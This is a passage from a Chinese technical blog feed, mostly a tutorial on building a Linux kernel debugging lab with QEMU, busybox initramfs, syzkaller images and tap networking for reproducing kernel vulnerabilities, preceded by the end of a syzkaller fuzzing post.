class="hljs-variable">$proc</span>&quot;</span>,<br>                <span class="hljs-string">&quot;read<span class="hljs-variable">$proc</span>&quot;</span>,<br>                <span class="hljs-string">&quot;write<span class="hljs-variable">$proc</span>&quot;</span>,<br>                <span class="hljs-string">&quot;close<span class="hljs-variable">$proc</span>&quot;</span><br>],<br></code></pre></td></tr></table></figure><p>修改my.cfg，添加上面的配置</p><p>然后运行 syzkaller：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">bin/syz-manager </span>-<span class="hljs-built_in">config</span> my.cfg -vv <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>跑了段时间</p><p><img src="2022-02-19_210656.png"></p><p><img src="2022-02-19_210806.png"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/hardenedlinux/Debian-GNU-Linux-Profiles/tree/master/docs/harbian_qa/fuzz_testing">https://github.com/hardenedlinux/Debian-GNU-Linux-Profiles/tree/master/docs/harbian_qa/fuzz_testing</a></p><p><a href="https://bbs.pediy.com/thread-265405.htm">https://bbs.pediy.com/thread-265405.htm</a></p><p><a href="https://www.jianshu.com/p/790b733f80a2">https://www.jianshu.com/p/790b733f80a2</a></p><p><a href="https://www.cnblogs.com/downey-blog/p/10486907.html">https://www.cnblogs.com/downey-blog/p/10486907.html</a></p><p><a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md">https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux内核调试环境搭建</title>
    <link href="/2021/10/27/Linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2021/10/27/Linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="内核源码下载"><a href="#内核源码下载" class="headerlink" title="内核源码下载"></a>内核源码下载</h2><p>内核源码下载渠道：</p><p>（1）git clone 内核，在git checkout某一个分支：git clone <a href="https://github.com/torvalds/linux.git">https://github.com/torvalds/linux.git</a> 适用于git commit补丁前的漏洞调试</p><p>（2）<a href="https://cdn.kernel.org/pub/linux/kernel/v4.x/">https://cdn.kernel.org/pub/linux/kernel/v4.x/</a> 适用于4.x.x版本的内核，下不到更小的发行版</p><p>（3）sudo apt-get source linux-image-$(uname -r) 下载当前内核版本或更小的发行版，缺点：版本不全</p><p>（4）按下面方式获取ubuntu 发行版源码编译，这样小版本的问题也解决了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">下载linux kernel源码切换分支<br>查看git仓库地址：https:<span class="hljs-regexp">//</span>wiki.ubuntu.com<span class="hljs-regexp">/Kernel/</span>Dev/KernelGitGuide<br>git clone git:<span class="hljs-regexp">//</span>kernel.ubuntu.com<span class="hljs-regexp">/ubuntu/u</span>buntu-xenial.git<br>git tag | grep <span class="hljs-number">4.4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">21</span><br>git checkout Ubuntu-<span class="hljs-number">4.4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">21.37</span><br></code></pre></td></tr></table></figure><p>一般选择方式1，找到漏洞引入的commit，切换过去。或者切到漏洞补丁的commit，然后将补丁手动注释，或者是git checkout patch_commit_id~1，切到补丁的上一个commit</p><p>也可以下载<a href="http://security.ubuntu.com/ubuntu/pool/main/l/linux/">http://security.ubuntu.com/ubuntu/pool/main/l/linux/</a> 中的linux-image-*-*amd64.deb包，解压里面有bzImage，如果能找到对应的vmlinux带符号镜像，那就可以直接调了，不然要想打断点调试，就得编译内核来获取镜像。</p><p>国内clone的很慢，可以用清华的源：<a href="https://mirrors.tuna.tsinghua.edu.cn/help/linux.git/">https://mirrors.tuna.tsinghua.edu.cn/help/linux.git/</a></p><p>克隆主线 linux 代码，使用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="hljs-regexp">/git/</span>linux.git<br></code></pre></td></tr></table></figure><h2 id="linux内核编译"><a href="#linux内核编译" class="headerlink" title="linux内核编译"></a>linux内核编译</h2><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">make</span> mrproper  <span class="hljs-meta">#清理下</span><br><br><br><span class="hljs-built_in">make</span> defconfig<br><span class="hljs-built_in">make</span> menuconfig<br><span class="hljs-built_in">make</span> -j8<br></code></pre></td></tr></table></figure><p>（1）先make defconfig，获取默认的config，这样的config配置少，可以极大提高编译速度，一般几分钟就好了。</p><p>（2）make menuconfig：要进行打断点调试，需要关闭系统的随机化和开启调试信息：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">Processor</span> <span class="hljs-selector-tag">type</span> <span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">features</span>  <span class="hljs-selector-tag">---</span>&gt; <br>    <span class="hljs-selector-attr">[ ]</span> <span class="hljs-selector-tag">Build</span> <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">relocatable</span> <span class="hljs-selector-tag">kernel</span>                                               <br>        <span class="hljs-selector-attr">[ ]</span>  <span class="hljs-selector-tag">Randomize</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">address</span> <span class="hljs-selector-tag">of</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">kernel</span> <span class="hljs-selector-tag">image</span> (KASLR) (NEW) <br><br><br><span class="hljs-selector-tag">Kernel</span> <span class="hljs-selector-tag">hacking</span>  <span class="hljs-selector-tag">---</span>&gt;<br>    <span class="hljs-selector-tag">Compile-time</span> <span class="hljs-selector-tag">checks</span> <span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">compiler</span> <span class="hljs-selector-tag">options</span>  <span class="hljs-selector-tag">---</span>&gt;  <br>        <span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Compile</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">kernel</span> <span class="hljs-selector-tag">with</span> <span class="hljs-selector-tag">debug</span> <span class="hljs-selector-tag">info</span>                                                                  <br>        <span class="hljs-selector-attr">[ ]</span>   <span class="hljs-selector-tag">Reduce</span> <span class="hljs-selector-tag">debugging</span> <span class="hljs-selector-tag">information</span>                                                                      <br>        <span class="hljs-selector-attr">[ ]</span>   <span class="hljs-selector-tag">Produce</span> <span class="hljs-selector-tag">split</span> <span class="hljs-selector-tag">debuginfo</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-class">.dwo</span> <span class="hljs-selector-tag">files</span>                                                             <br>        <span class="hljs-selector-attr">[*]</span>   <span class="hljs-selector-tag">Generate</span> <span class="hljs-selector-tag">dwarf4</span> <span class="hljs-selector-tag">debuginfo</span>                                         <br>        <span class="hljs-selector-attr">[*]</span>   <span class="hljs-selector-tag">Provide</span> <span class="hljs-selector-tag">GDB</span> <span class="hljs-selector-tag">scripts</span> <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">kernel</span> <span class="hljs-selector-tag">debugging</span>  <br></code></pre></td></tr></table></figure><p>以上配置完成后会在当前目录生成 <code>.config</code> 文件，我们可以使用 <code>grep</code> 进行验证：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># grep CONFIG_DEBUG_INFO .config</span><br>CONFIG_DEBUG_INFO=y<br></code></pre></td></tr></table></figure><p>（3）内核编译</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk"> $ nproc       <span class="hljs-comment"># 查看当前的系统核数</span><br> $ make -j <span class="hljs-number">8</span>  <span class="hljs-comment"># 或者采用 make bzImage 进行编译， -j N，表示使用多少核并行编译</span><br> <br> <span class="hljs-comment"># 未压缩的内核文件，这个在 gdb 的时候需要加载，用于读取 symbol 符号信息，由于包含调试信息所以比较大</span><br> $ ls -hl vmlinux <br>-rwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">449</span>M Feb  <span class="hljs-number">3</span> <span class="hljs-number">14</span>:<span class="hljs-number">46</span> vmlinux<br><br><span class="hljs-comment"># 压缩后的镜像文件 </span><br>$ ls -hl .<span class="hljs-regexp">/arch/</span>x86_64<span class="hljs-regexp">/boot/</span>bzImage<br>lrwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">22</span> Feb  <span class="hljs-number">3</span> <span class="hljs-number">14</span>:<span class="hljs-number">47</span> .<span class="hljs-regexp">/arch/</span>x86_64<span class="hljs-regexp">/boot/</span>bzImage -&gt; ..<span class="hljs-regexp">/../</span>x86<span class="hljs-regexp">/boot/</span>bzImage<br><br>$ ls -hl .<span class="hljs-regexp">/arch/</span>x86<span class="hljs-regexp">/boot/</span>bzImage<br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">7.6</span>M Feb  <span class="hljs-number">3</span> <span class="hljs-number">14</span>:<span class="hljs-number">47</span> .<span class="hljs-regexp">/arch/</span>x86<span class="hljs-regexp">/boot/</span>bzImage<br></code></pre></td></tr></table></figure><p>如果要用到userfaultfd、ebpf的系统调用，需要在编译选项中开启：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">General setup  <span class="hljs-comment">---&gt;  </span><br>   [*] <span class="hljs-keyword">Enable</span> bpf() <span class="hljs-keyword">system</span> <span class="hljs-keyword">call</span>                                                <br>   [*] <span class="hljs-keyword">Enable</span> userfaultfd() <span class="hljs-keyword">system</span> <span class="hljs-keyword">call</span>     <br></code></pre></td></tr></table></figure><h2 id="构建initramfs根文件系统"><a href="#构建initramfs根文件系统" class="headerlink" title="构建initramfs根文件系统"></a>构建initramfs根文件系统</h2><h4 id="什么是initramfs-基于ramfs的临时文件系统"><a href="#什么是initramfs-基于ramfs的临时文件系统" class="headerlink" title="什么是initramfs(基于ramfs的临时文件系统)"></a>什么是initramfs(基于ramfs的临时文件系统)</h4><ul><li><p>initramfs 是一种以 cpio 格式压缩后的 rootfs 文件系统，它通常和 Linux 内核文件一起被打包成 boot.img 作为启动镜像</p></li><li><p>BootLoader 加载 boot.img，并启动内核之后，内核接着就对 cpio 格式的 initramfs 进行解压， 并将解压后得到的 rootfs 加载进内存，最后内核会检查 rootfs 中是否存在 init 可执行文件（该 init 文件本质上是一个执行的 shell 脚本），如果存在，就开始执行 init 程序并创建 Linux 系统用 户空间 PID 为 1 的进程，然后将磁盘中存放根目录内容的分区真正地挂载到 / 根目录上，最后通 过 exec chroot . /sbin/init 命令来将 rootfs 中的根目录切换到挂载了实际磁盘分区文件系统中， 并执行 /sbin/init 程序来启动系统中的其他进程和服务。 基于ramfs开发initramfs，取代了initrd。</p></li></ul><h4 id="什么是initrd"><a href="#什么是initrd" class="headerlink" title="什么是initrd"></a>什么是initrd</h4><ul><li><p>initrd代指内核启动过程中的一个阶段，临时挂载文件系统，加载硬盘的基础驱动，进而过渡到最 终的根文件系统 </p></li><li><p>是早期基于ramdisk生成的临时根文件系统的名称 </p></li><li><p>现阶段虽然基于initramfs，但是临时根文件系统也依然存在某些发行版称其为initrd </p></li><li><p>例：CentOS 临时根文件系统命名为 initramfs-<code>uname -r</code>.img Ubuntu 临时根文件系统命名为 initrd-<code>uname -r</code>.img</p></li></ul><h4 id="为什么需要initrd-initramfs"><a href="#为什么需要initrd-initramfs" class="headerlink" title="为什么需要initrd/initramfs"></a>为什么需要initrd/initramfs</h4><ul><li><p>Linux kernel在自身初始化完成之后，需要能够找到并运行第一个用户程序（这个程序通常叫 做“init”程序）。用户程序存在于文件系统之中，因此，内核必须找到并挂载一个文件系统才可以 成功完成系统的引导过程。</p><p>在grub中提供了一个选项“root=”用来指定第一个文件系统，但随着硬件的发展，很多情况下这个 文件系统也许是存放在USB设备，SCSI设备等等多种多样的设备之上，如果需要正确引导，USB或 者SCSI驱动模块首先需要运行起来，可是不巧的是，这些驱动程序也是存放在文件系统里，因此 会形成一个悖论。</p></li><li><p>为解决此问题，Linux kernel提出了一个RAM disk的解决方案，把一些启动所必须的用户程序和驱 动模块放在RAM disk中，这个RAM disk看上去和普通的disk一样，有文件系统，有cache，内核 启动时，首先把RAM disk挂载起来，等到init程序和一些必要模块运行起来之后，再切到真正的文 件系统之中。</p></li><li><p>上面提到的RAM disk的方案实际上就是initrd。 如果仔细考虑一下，initrd虽然解决了问题但并不 完美。 比如，disk有cache机制，对于RAM disk来说，这个cache机制就显得很多余且浪费空间； disk需要文件系统，那文件系统（如ext2等）必须被编译进kernel而不能作为模块来使用。</p></li><li><p>Linux 2.6 kernel提出了一种新的实现机制，即initramfs。顾名思义，initramfs只是一种RAM filesystem而不是disk。initramfs实际是一个cpio归档，启动所需的用户程序和驱动模块被归档成 一个文件。因此，不需要cache，也不需要文件系统。</p></li></ul><h3 id="制作根文件系统：利用busybox生成根文件系统"><a href="#制作根文件系统：利用busybox生成根文件系统" class="headerlink" title="制作根文件系统：利用busybox生成根文件系统"></a>制作根文件系统：利用busybox生成根文件系统</h3><p>（1）下载busybox</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> ~/oslab<br>wget https://busybox.net/downloads/busybox-1.32.1.tar.bz2 <span class="hljs-comment">#下载 备用链接:  https://od.srpr.cc/acgg0/busybox-1.32.1.tar.bz2</span><br>tar -jxvf busybox-1.32.1.tar.bz2 <span class="hljs-comment">#解压</span><br><span class="hljs-built_in">cd</span> ~/oslab/busybox-1.32.1<br></code></pre></td></tr></table></figure><p>（2）编译busybox</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">make menuconfig <span class="hljs-comment">#修改配置如下：</span><br></code></pre></td></tr></table></figure><p>修改配置如下：(空格键勾选)</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Settings –&gt;<br><span class="hljs-keyword">Build </span>Options<br>[*] <span class="hljs-keyword">Build </span>static <span class="hljs-keyword">binary（no </span><span class="hljs-keyword">share </span>libs）<br></code></pre></td></tr></table></figure><p>编译并安装</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">make</span> -j $((<span class="hljs-string">`nproc`</span><span class="hljs-number">-1</span>)<br>sudo <span class="hljs-built_in">make</span> install<br></code></pre></td></tr></table></figure><p>（3）准备根文件系统</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> ~/oslab/busybox-1.32.1/_install<br>sudo mkdir dev<br>sudo mknod dev/console c 5 1<br>sudo mknod dev/ram b 1 0<br>sudo touch init<br></code></pre></td></tr></table></figure><p>在init中写入以下内容,你可以使用vim或gedit编辑器写入(<a href="https://www.openvim.com/">vim tutorial</a>)，执行sudo vim init 或 sudo gedit init.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span><br>echo &quot;INIT SCRIPT&quot;<br>mkdir /proc<br>mkdir /sys<br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mkdir /tmp<br>mount -t tmpfs none /tmp<br>echo -e &quot;\nThis boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;<br>exec /bin/sh<br></code></pre></td></tr></table></figure><p>赋予init脚本执行，制作initramfs文件，将x86-busybox下面的内容打包归档成cpio文件，以供 Linux内核做initramfs启动执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo chmod +x init<br><span class="hljs-built_in">cd</span> ~/oslab/busybox-1.32.1/_install<br>find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt;<br>~/oslab/initramfs-busybox-x64.cpio.gz <span class="hljs-comment"># 注意：该命令一定要在busybox的 _install目录下执行</span><br><span class="hljs-comment"># 注意：每次修改_install,都要重新执行该命令</span><br><span class="hljs-comment">#find . | cpio -o --format=newc &gt; ../rootfs.img</span><br><br></code></pre></td></tr></table></figure><p>（4）运行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> ~/oslab<br><span class="hljs-comment">## qemu 以图形界面，弹出窗口形式运行内核</span><br>qemu-system-x86_64 -s -kernel ~/oslab/linux-4.9.263/arch/x86_64/boot/bzImage<br>-initrd ~/oslab/initramfs-busybox-x64.cpio.gz --append <span class="hljs-string">&quot;nokaslr</span><br><span class="hljs-string">root=/dev/ram init=/init&quot;</span><br><br><span class="hljs-comment">## Ubuntu 20.04/20.10 环境下如果出现问题，可执行以下指令 (部分Ubuntu20.04/20.10系统编译linux后bzImage也在x86_64中, 根据实际情况选择bzImage路径)</span><br>qemu-system-x86_64 -s -kernel ~/oslab/linux-4.9.263/arch/x86/boot/bzImage -<br>initrd ~/oslab/initramfs-busybox-x64.cpio.gz --append <span class="hljs-string">&quot;nokaslr root=/dev/ram</span><br><span class="hljs-string">init=/init&quot;</span><br><br><span class="hljs-comment">## 如不希望qemu以图形界面启动，而希望以无界面形式启动，输出重定向到当前shell，使用以下命令</span><br>qemu-system-x86_64 -s -kernel ~/oslab/linux-4.9.263/arch/x86_64/boot/bzImage<br>-initrd ~/oslab/initramfs-busybox-x64.cpio.gz --append <span class="hljs-string">&quot;nokaslr</span><br><span class="hljs-string">root=/dev/ram init=/init console=ttyS0 &quot;</span> -nographic<br></code></pre></td></tr></table></figure><h3 id="下载文件系统镜像"><a href="#下载文件系统镜像" class="headerlink" title="下载文件系统镜像"></a>下载文件系统镜像</h3><p>（1）如果漏洞不涉及很多模块，较为简单的就是下载一个ctf kernel pwn的镜像文件，对镜像文件rootfs.img 进行解包修改：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mkdir core<br>mv rootfs<span class="hljs-selector-class">.img</span> ./core/rootfs<span class="hljs-selector-class">.cpio</span><span class="hljs-selector-class">.gz</span> <br>cd core<br>gunzip rootfs<span class="hljs-selector-class">.cpio</span><span class="hljs-selector-class">.gz</span><br>cpio -idmv &lt; rootfs<span class="hljs-selector-class">.cpio</span><br>rm -rf rootfs.cpio<br></code></pre></td></tr></table></figure><p>将漏洞exp放入，再重新打包：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> . | cpio -o <span class="hljs-attribute">--format</span>=newc &gt; <span class="hljs-built_in">..</span>/rootfs.img<br></code></pre></td></tr></table></figure><p>(2) 涉及较为复杂的模块，如网络，驱动，或者应用层组件，可以获取下面syzkaller的镜像：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">sudo</span> <span class="hljs-string">apt-get</span> <span class="hljs-string">install</span> <span class="hljs-string">debootstrap</span><br><span class="hljs-string">wget</span> <span class="hljs-string">https</span>://<span class="hljs-string">raw</span>.<span class="hljs-string">githubusercontent</span>.<span class="hljs-string">com</span>/<span class="hljs-string">google</span>/<span class="hljs-string">syzkaller</span>/<span class="hljs-string">master</span>/<span class="hljs-string">tools</span>/<span class="hljs-built_in">create-image.sh</span> -<span class="hljs-string">O</span> <span class="hljs-built_in">create-image.sh</span><br><span class="hljs-string">chmod</span> +<span class="hljs-string">x</span> <span class="hljs-built_in">create-image.sh</span><br>./<span class="hljs-built_in">create-image.sh</span><br></code></pre></td></tr></table></figure><p>上述步骤操作完，已经可以使用scp命令将exp放入镜像中。但也可以自己配置网络上网，下载Exp到系统中：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">将<span class="hljs-regexp">/etc/</span>network/interfaces中设置成dhcp,将eth0 改成ip addr 显示的网卡:<br>auto eth0<br>iface eth0 inet dhcp<br>重启网络服务:<span class="hljs-regexp">/etc/i</span>nit.d/networking restart<br></code></pre></td></tr></table></figure><p>此时qemu可以访问外网，host还不能和qemu通信，所以配置下guest与 host 通信。</p><h4 id="配置-guest与-host-通信"><a href="#配置-guest与-host-通信" class="headerlink" title="配置 guest与 host 通信"></a>配置 guest与 host 通信</h4><p>使用tap方式上网：</p><p>a、host主机上的配置：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo apt-get <span class="hljs-keyword">install </span>uml-utilities<br>sudo apt-get <span class="hljs-keyword">install </span><span class="hljs-keyword">bridge-utils</span><br><span class="hljs-keyword"></span><br>sudo ifconfig ens33 down              <br>sudo <span class="hljs-keyword">brctl </span><span class="hljs-keyword">addbr </span><span class="hljs-keyword">br0 </span>                     <br>sudo <span class="hljs-keyword">brctl </span><span class="hljs-keyword">addif </span><span class="hljs-keyword">br0 </span>ens33            <br>sudo <span class="hljs-keyword">brctl </span>stp <span class="hljs-keyword">br0 </span>off                 <br>sudo <span class="hljs-keyword">brctl </span>setfd <span class="hljs-keyword">br0 </span><span class="hljs-number">1</span>                 <br>sudo <span class="hljs-keyword">brctl </span>sethello <span class="hljs-keyword">br0 </span><span class="hljs-number">1</span>              <br>sudo ifconfig <span class="hljs-keyword">br0 </span><span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> promisc up      <br>sudo ifconfig ens33 <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> promisc up      <br>sudo dhclient <span class="hljs-keyword">br0</span><br><span class="hljs-keyword"></span>sudo <span class="hljs-keyword">brctl </span><span class="hljs-keyword">show </span><span class="hljs-keyword">br0</span><br><span class="hljs-keyword"></span>sudo <span class="hljs-keyword">brctl </span><span class="hljs-keyword">showstp </span><span class="hljs-keyword">br0</span><br><span class="hljs-keyword"></span><br>sudo ip tuntap <span class="hljs-keyword">add </span>mode tap user $(whoami)<br>sudo tunctl -t tap0 -u root    <br>sudo <span class="hljs-keyword">brctl </span><span class="hljs-keyword">addif </span><span class="hljs-keyword">br0 </span>tap0<br>sudo ifconfig tap0 <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br>sudo <span class="hljs-keyword">brctl </span><span class="hljs-keyword">showstp </span><span class="hljs-keyword">br0</span><br><span class="hljs-keyword"></span><br>删除tap0<br>sudo tunctl -d tap0<br></code></pre></td></tr></table></figure><p>b、qemu虚拟机上的配置：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">设置ssh登陆：<br>sudo vim <span class="hljs-regexp">/etc/</span>pam.d/sshd<br>注释下面两处，运行root和普通用户ssh登陆：<br><br><span class="hljs-comment"># Disallow non-root logins when /etc/nologin exists.</span><br><span class="hljs-comment">#account    required     pam_nologin.so</span><br><br><br><span class="hljs-comment"># Uncomment and edit /etc/security/access.conf if you need to set complex</span><br><span class="hljs-comment"># access limits that are hard to express in sshd_config.</span><br><span class="hljs-comment"># account  required     pam_access.so</span><br><br>sudo <span class="hljs-regexp">/etc/i</span>nit.d/ssh start  <span class="hljs-comment">#启动ssh</span><br></code></pre></td></tr></table></figure><h2 id="启动qemu进行漏洞调试"><a href="#启动qemu进行漏洞调试" class="headerlink" title="启动qemu进行漏洞调试"></a>启动qemu进行漏洞调试</h2><p>qemu 启动脚本：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livescript">sudo qemu-system-x86_64 <span class="hljs-string">\</span><br>    -m <span class="hljs-number">2</span>G <span class="hljs-string">\</span><br>    -smp <span class="hljs-number">2</span> <span class="hljs-string">\</span><br>    -kernel ./bzImage <span class="hljs-string">\</span><br>    -append <span class="hljs-string">&quot;console=ttyS0 root=/dev/sda earlyprintk=serial&quot;</span><span class="hljs-string">\</span><br>    -drive file=./stretch.img,format=raw <span class="hljs-string">\</span><br>    -net nic <span class="hljs-string">\</span><br>    -net tap,ifname=tap0,script=<span class="hljs-literal">no</span>,downscript=<span class="hljs-literal">no</span> <span class="hljs-string">\</span><br>    -enable-kvm <span class="hljs-string">\</span><br>    -nographic <span class="hljs-string">\</span><br>    -pidfile vm.pid <span class="hljs-string">\</span><br>    <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | tee vm.log<br></code></pre></td></tr></table></figure><p>参数解释：</p><p>“smp”指定了处理器的个数；</p><p>“m”指定了内存的大小；</p><p>“kernel”指定编译生成的内核镜像的存放位置；</p><p>“append”是内核启动的附加参数；</p><p>“drive”指定之前制作生成的根文件系统的镜像位置；</p><p>-nographic：通常，QEMU使用SDL显示VGA输出，使用这个选项，使qemu成为简单的命令行应用程序；</p><p><code>-S</code>参数可以让QEMU启动后CPU先Pause住不运行；</p><p> <code>-s</code>参数是<code>-gdb tcp::1234</code>的简写，意思是让QEMU侧的gdb server侦听在1234端口等待调试．</p><p>由于设置为tap方式，host和qemu在同一个网段里，同时其他host虚拟机也可以进行ssh连接qemu</p><p>默认登陆的是root用户，添加sudo 用户：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">adduser pwn</span><br><span class="hljs-attribute">usermod -aG sudo pwn</span><br></code></pre></td></tr></table></figure><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># 选项说明</span><br><span class="hljs-meta"># -m 指定内存数量</span><br><span class="hljs-meta"># -kernel 指定 bzImage 的镜像路径</span><br><span class="hljs-meta"># -s 等价于 